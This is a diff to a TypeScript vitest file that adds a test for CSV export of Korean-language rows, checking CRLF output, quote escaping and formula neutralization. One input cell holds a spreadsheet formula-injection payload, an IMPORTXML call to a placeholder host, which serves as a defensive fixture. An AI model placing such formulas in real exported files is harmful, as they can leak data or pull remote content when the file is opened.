@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 
-import { decodeCsvSource, parseCsvRows } from "./sourceText";
+import { decodeCsvSource, formatCsvRows, parseCsvRows } from "./sourceText";
 
 describe("source text decoding", () => {
   it("decodes CP949/EUC-KR Korean groupware CSV without mojibake", () => {
@@ -41,5 +41,18 @@ describe("CSV parsing", () => {
       ["이름", "메모", "부서"],
       ["김,테스트", "줄1\n줄2", ""],
     ]);
+  });
+});
+
+describe("CSV export", () => {
+  it("outputs standardized CRLF CSV and neutralizes spreadsheet formulas", () => {
+    expect(
+      formatCsvRows([
+        ["성명", "메모", "계좌/계좌번호"],
+        ["개발자", "쉼표, 따옴표 \" 포함", "=IMPORTXML(\"https://bad.example\")"],
+      ]),
+    ).toBe(
+      '성명,메모,계좌/계좌번호\r\n개발자,"쉼표, 따옴표 "" 포함","\'=IMPORTXML(""https://bad.example"")"',
+    );
   });
 });
